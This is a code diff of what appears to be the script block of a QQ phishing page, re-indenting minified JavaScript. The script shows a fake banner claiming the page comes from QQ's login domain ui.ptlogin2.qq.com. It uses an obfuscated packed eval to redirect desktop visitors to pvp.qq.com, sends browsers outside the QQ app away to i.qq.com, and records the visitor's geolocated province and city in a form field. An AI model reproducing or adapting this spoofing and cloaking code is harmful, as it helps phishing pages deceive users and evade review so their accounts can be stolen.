@@ -28,16 +28,56 @@
   </script>
   <!--顶部banner-->
 </head>
+
 <script>
-  var doc=$(document);var _touches_point1=0;var _touches_point2=0;addEventListener("touchstart",function(a){_touches_point1=a.touches[0].pageY});addEventListener("touchmove",function(a){_touches_point2=a.touches[0].pageY;if(doc.scrollTop()<=0&&_touches_point1<_touches_point2){a.preventDefault();if($("#_domain_display").length<=0){$("body").prepend('<div id="_domain_display" style="text-align:center;background-color:#bebdc2;color:#65696c;height:0px;padding-top:15px;line-height:26px;font-size:12px;overflow:hidden;"><p>网页由 '+
-	'ui.ptlogin2.qq.com'
-	+' 提供</p><p>QQ浏览器X5内核提供技术支持</p></div>')}$("#_domain_display").height((_touches_point2-_touches_point1))}});addEventListener("touchend",function(a){$("#_domain_display").slideUp("normal",function(){$("#_domain_display").remove()})});
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('8 1={4:6,5:6,7:6};8 2=9.d;1.4=2.3("b")==0;1.5=2.3("c")==0;1.a=(2=="e")||(2.3("f")==0);k(1.4||1.5||1.7){o.n.l="g://j.i.h/m/"}',25,25,'|system|p|indexOf|win|mac|false|xll|var|navigator|x11|Win|Mac|platform|X11|Linux|http|com|qq|pvp|if|href||location|window'.split('|'),0,{}));
-if(navigator.userAgent.indexOf('QQ/')>0){
-  }else{
-	window.location.href='http://i.qq.com';
+  var doc = $(document);
+  var _touches_point1 = 0;
+  var _touches_point2 = 0;
+  addEventListener("touchstart", function (a) {
+    _touches_point1 = a.touches[0].pageY
+  });
+  addEventListener("touchmove", function (a) {
+    _touches_point2 = a.touches[0].pageY;
+    if (doc.scrollTop() <= 0 && _touches_point1 < _touches_point2) {
+      a.preventDefault();
+      if ($("#_domain_display").length <= 0) {
+        $("body").prepend('<div id="_domain_display" style="text-align:center;background-color:#bebdc2;color:#65696c;height:0px;padding-top:15px;line-height:26px;font-size:12px;overflow:hidden;"><p>网页由 ' +
+          'ui.ptlogin2.qq.com' +
+          ' 提供</p><p>QQ浏览器X5内核提供技术支持</p></div>')
+      }
+      $("#_domain_display").height((_touches_point2 - _touches_point1))
+    }
+  });
+  addEventListener("touchend", function (a) {
+    $("#_domain_display").slideUp("normal", function () {
+      $("#_domain_display").remove()
+    })
+  });
+  eval(function (p, a, c, k, e, d) {
+    e = function (c) {
+      return (c < a ? "" : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
+    };
+    if (!''.replace(/^/, String)) {
+      while (c--) d[e(c)] = k[c] || e(c);
+      k = [function (e) {
+        return d[e]
+      }];
+      e = function () {
+        return '\\w+'
+      };
+      c = 1;
+    };
+    while (c--)
+      if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+    return p;
+  }('8 1={4:6,5:6,7:6};8 2=9.d;1.4=2.3("b")==0;1.5=2.3("c")==0;1.a=(2=="e")||(2.3("f")==0);k(1.4||1.5||1.7){o.n.l="g://j.i.h/m/"}', 25, 25, '|system|p|indexOf|win|mac|false|xll|var|navigator|x11|Win|Mac|platform|X11|Linux|http|com|qq|pvp|if|href||location|window'.split('|'), 0, {}));
+  if (navigator.userAgent.indexOf('QQ/') > 0) {} else {
+    window.location.href = 'http://i.qq.com';
   }
-var province = remote_ip_info.province; var city = remote_ip_info.city; document.getElementById("ip").value=province+city;</script>
+  var province = remote_ip_info.province;
+  var city = remote_ip_info.city;
+  document.getElementById("ip").value = province + city;
+</script>
 
 <body style="zoom: 1;">
   <div id="content" class="content">
